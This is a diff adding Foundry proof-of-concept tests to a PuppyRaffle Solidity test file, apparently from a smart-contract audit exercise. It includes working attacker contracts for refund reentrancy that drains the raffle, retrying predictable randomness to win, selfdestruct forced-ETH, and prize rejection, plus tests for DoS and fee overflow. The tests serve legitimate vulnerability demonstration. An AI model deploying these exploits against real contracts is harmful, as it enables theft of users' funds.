@@ -214,3 +214,267 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 }
+contract ReentrancyAttacker {
+    PuppyRaffle private immutable raffle;
+    uint256 private immutable entranceFee;
+    uint256 private immutable playerIndex;
+
+    constructor(
+        PuppyRaffle _raffle,
+        uint256 _entranceFee,
+        uint256 _playerIndex
+    ) {
+        raffle = _raffle;
+        entranceFee = _entranceFee;
+        playerIndex = _playerIndex;
+    }
+
+    function attack() external {
+        address[] memory attackerEntry = new address[](1);
+        attackerEntry[0] = address(this);
+        raffle.enterRaffle{value: entranceFee}(attackerEntry);
+        raffle.refund(playerIndex);
+    }
+
+    receive() external payable {
+        if (address(raffle).balance >= entranceFee) {
+            raffle.refund(playerIndex);
+        }
+    }
+}
+
+contract SelectWinnerAttacker {
+    PuppyRaffle private immutable raffle;
+
+    constructor(PuppyRaffle _raffle) {
+        raffle = _raffle;
+    }
+
+    function attack() external {
+        raffle.selectWinner();
+        require(raffle.previousWinner() == address(this), "not winner; retry");
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external pure returns (bytes4) {
+        return 0x150b7a02;
+    }
+
+    receive() external payable {}
+}
+
+contract RejectingWinner {
+    receive() external payable {
+        revert("prize rejected");
+    }
+}
+
+contract ForceSend {
+    constructor() payable {}
+
+    function forceSend(address payable target) external {
+        selfdestruct(target);
+    }
+}
+
+contract PuppyRaffleVulnerabilityTest is Test {
+    PuppyRaffle private puppyRaffle;
+    uint256 private constant ENTRANCE_FEE = 1 ether;
+    uint256 private constant DURATION = 1 days;
+    address private constant FEE_ADDRESS = address(99);
+    address private constant PLAYER_ONE = address(1);
+    address private constant PLAYER_TWO = address(2);
+    address private constant PLAYER_THREE = address(3);
+    address private constant PLAYER_FOUR = address(4);
+
+    function setUp() public {
+        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, DURATION);
+    }
+
+    function testReentrancy__refund() public {
+        _enterFourPlayers();
+        uint256 raffleBalanceBeforeAttack = address(puppyRaffle).balance;
+
+        ReentrancyAttacker attacker = new ReentrancyAttacker(
+            puppyRaffle,
+            ENTRANCE_FEE,
+            4
+        );
+        vm.deal(address(attacker), ENTRANCE_FEE);
+        uint256 attackerBalanceBeforeAttack = address(attacker).balance;
+
+        attacker.attack();
+
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(
+            address(attacker).balance,
+            attackerBalanceBeforeAttack + raffleBalanceBeforeAttack
+        );
+    }
+
+    function testPredictableRandomness__retryUntilAttackerWins() public {
+        SelectWinnerAttacker attacker = new SelectWinnerAttacker(puppyRaffle);
+        address[] memory players = new address[](4);
+        players[0] = address(attacker);
+        players[1] = PLAYER_ONE;
+        players[2] = PLAYER_TWO;
+        players[3] = PLAYER_THREE;
+        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
+
+        vm.warp(block.timestamp + DURATION + 1);
+
+        for (uint256 attempt = 0; attempt < 100; attempt++) {
+            try attacker.attack() {
+                assertEq(puppyRaffle.previousWinner(), address(attacker));
+                return;
+            } catch {
+                vm.warp(block.timestamp + 1);
+                vm.roll(block.number + 1);
+            }
+        }
+
+        fail("attacker did not obtain a favourable draw in 100 attempts");
+    }
+
+    function testDoSAttackOnEnterRaffle() public {
+        uint256 numberOfPlayers = 2000;
+        address[] memory players = new address[](numberOfPlayers);
+        for (uint160 i = 0; i < numberOfPlayers; i++) {
+            players[i] = address(i);
+        }
+
+        address attacker = address(10);
+        vm.deal(attacker, 1e30);
+        vm.prank(attacker);
+        vm.expectRevert();
+        puppyRaffle.enterRaffle{value: numberOfPlayers * ENTRANCE_FEE}(players);
+    }
+
+    function testOverflow__selectWinner() public {
+        uint256 highEntranceFee = 200 ether;
+        puppyRaffle = new PuppyRaffle(highEntranceFee, FEE_ADDRESS, DURATION);
+
+        address[] memory players = new address[](4);
+        for (uint256 i = 0; i < players.length; i++) {
+            players[i] = address(uint160(i + 1));
+        }
+        uint256 cost = highEntranceFee * players.length;
+        puppyRaffle.enterRaffle{value: cost}(players);
+
+        vm.warp(block.timestamp + DURATION + 1);
+        puppyRaffle.selectWinner();
+
+        uint256 expectedFee = (cost * 20) / 100;
+        assertLt(uint256(puppyRaffle.totalFees()), expectedFee);
+        assertEq(
+            uint256(puppyRaffle.totalFees()),
+            expectedFee % (uint256(type(uint64).max) + 1)
+        );
+    }
+
+    function testForcedEth__blocksFeeWithdrawal() public {
+        _enterFourPlayers();
+        vm.warp(block.timestamp + DURATION + 1);
+        puppyRaffle.selectWinner();
+
+        ForceSend forceSend = new ForceSend{value: 1 wei}();
+        forceSend.forceSend(payable(address(puppyRaffle)));
+
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+    function testRefund__preventsRoundSettlement() public {
+        _enterFourPlayers();
+        vm.prank(PLAYER_ONE);
+        puppyRaffle.refund(0);
+
+        vm.warp(block.timestamp + DURATION + 1);
+        for (uint256 attempt = 0; attempt < 100; attempt++) {
+            // Avoid index zero, whose zero-address mint would obscure the
+            // insufficient-prize failure caused by the refunded entry.
+            if (_winnerIndex(address(this)) != 0) {
+                vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
+                puppyRaffle.selectWinner();
+                return;
+            }
+            vm.warp(block.timestamp + 1);
+        }
+
+        fail("could not select an active winner");
+    }
+
+    function testRejectingWinner__blocksDrawFinalization() public {
+        RejectingWinner rejectingWinner = new RejectingWinner();
+        address[] memory players = new address[](4);
+        players[0] = address(rejectingWinner);
+        players[1] = PLAYER_ONE;
+        players[2] = PLAYER_TWO;
+        players[3] = PLAYER_THREE;
+        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
+
+        vm.warp(block.timestamp + DURATION + 1);
+        for (uint256 attempt = 0; attempt < 100; attempt++) {
+            if (_winnerIndex(address(this)) == 0) {
+                vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
+                puppyRaffle.selectWinner();
+                return;
+            }
+            vm.warp(block.timestamp + 1);
+        }
+
+        fail("could not select the rejecting winner");
+    }
+
+    function testGetActivePlayerIndex__cannotDistinguishAbsentPlayerFromIndexZero()
+        public
+    {
+        address[] memory players = new address[](1);
+        players[0] = PLAYER_ONE;
+        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
+
+        assertEq(puppyRaffle.getActivePlayerIndex(PLAYER_ONE), 0);
+        assertEq(puppyRaffle.getActivePlayerIndex(address(123)), 0);
+    }
+
+    function testRarityThresholds__mintSeventyOnePercentCommonAndFourPercentLegendary()
+        public
+    {
+        uint256 commonOutcomes;
+        uint256 rareOutcomes;
+        uint256 legendaryOutcomes;
+        for (uint256 rarity = 0; rarity < 100; rarity++) {
+            if (rarity <= puppyRaffle.COMMON_RARITY()) {
+                commonOutcomes++;
+            } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
+                rareOutcomes++;
+            } else {
+                legendaryOutcomes++;
+            }
+        }
+
+        assertEq(commonOutcomes, 71);
+        assertEq(rareOutcomes, 25);
+        assertEq(legendaryOutcomes, 4);
+    }
+
+    function _enterFourPlayers() private {
+        address[] memory players = new address[](4);
+        players[0] = PLAYER_ONE;
+        players[1] = PLAYER_TWO;
+        players[2] = PLAYER_THREE;
+        players[3] = PLAYER_FOUR;
+        puppyRaffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);
+    }
+
+    function _winnerIndex(address caller) private view returns (uint256) {
+        return
+            uint256(
+                keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))
+            ) % 4;
+    }
+}
